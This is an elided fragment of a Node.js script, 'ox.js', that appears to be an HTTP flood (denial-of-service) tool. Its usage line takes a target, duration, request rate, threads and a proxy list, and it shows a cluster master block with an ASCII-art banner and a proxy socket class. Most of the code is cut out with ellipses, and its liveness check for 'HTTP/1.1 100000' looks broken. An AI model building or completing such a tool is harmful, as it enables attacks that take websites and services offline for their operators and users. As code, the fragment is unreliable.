...
'*'
 ...
 if (process.argv.length < 7){console.log(`node ox.js target time rate thread proxies.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log(`                                                  _.oo. `);
    console.log(`                           _.u[[/;:,.         .odMMMMMM `);
    console.log(`                        .o888UU[[[/;:-.  .o@P^    MMM^ `);
    console.log(`                       oN88888UU[[[/;::-.        dP^ `);
    console.log(`                      dNMMNN888UU[[[/;:--.   .o@P^ `);
    console.log(`                     ,MMMMMMN888UU[[/;::-. o@^ `);
    console.log(`                     NNMMMNN888UU[[[/~.o@P^ `);
    console.log(`                     888888888UU[[[/o@^-.. `);
    console.log(`                    oI8888UU[[[/o@P^:--.. `);
    console.log(`                 .@^  YUU[[[/o@^;::---.. `);
    console.log(`               oMP     ^/o@P^;:::---.. `);
    console.log(`            .dMMM    .o@^ ^;::---... `);
...
class NetSocket {
    ...
    HTTP(options, callback) {
        ...
        connection.on("data", chunk => {
            ...
            const isAlive = response.includes("HTTP/1.1 100000");
            if (isAlive === false) {
                connection.destroy();
